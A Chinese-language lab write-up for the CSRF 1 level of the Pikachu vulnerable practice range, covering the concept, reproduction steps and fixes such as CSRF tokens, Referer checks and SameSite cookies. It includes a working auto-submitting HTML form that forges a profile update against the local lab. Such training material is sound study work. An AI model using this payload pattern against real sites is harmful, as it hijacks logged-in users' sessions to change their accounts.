# Pikachu | CSRF 1
## 一、漏洞简介
CSRF跨站请求伪造：用户登录状态下，访问攻击者构造的页面，自动发起请求执行操作，盗用用户身份。**不需要拿到cookie，利用浏览器自动携带cookie**。
## 二、环境信息
靶场地址：http://127.0.0.1/pikachu/
关卡路径：/vul/csrf/csrf1.php
## 三、复现步骤
1. 登录账号，修改资料抓包，发现修改信息的请求没有token校验
2. 构造html页面，自动提交表单
```html
<form action="http://127.0.0.1/pikachu/vul/csrf/csrf1.php" method="post">
<input type="hidden" name="username" value="hacker">
<input type="hidden" name="sex" value="男">
<input type="hidden" name="phonenum" value="123456">
</form>
<script>document.forms[0].submit();</script>
3. 诱使已经登录的受害者访问这个页面，自动执行修改

四、Payload

自动提交表单html

五、漏洞原理

请求没有校验csrf token，浏览器会自动带上当前站点cookie。

六、修复方案

1. 添加CSRF Token

2. 校验Referer

3. SameSite Cookie

七、总结

CSRF：盗用登录态执行操作；XSS可以拿cookie，二者区分记忆。